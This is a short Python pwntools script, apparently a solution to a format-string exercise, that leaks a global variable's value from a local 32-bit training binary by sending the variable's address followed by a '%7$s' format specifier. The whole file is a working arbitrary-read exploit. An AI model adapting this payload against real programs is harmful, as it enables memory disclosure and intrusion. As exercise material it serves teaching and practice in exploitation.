#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-read-32")

print(p.recv())

addr_global_var = p.elf.symbols["random_value"]

print(hex(addr_global_var))

buf = p32(addr_global_var) + "%7$s"


p.sendline(buf)

rec = p.recv()
print(repr(rec))





p.interactive()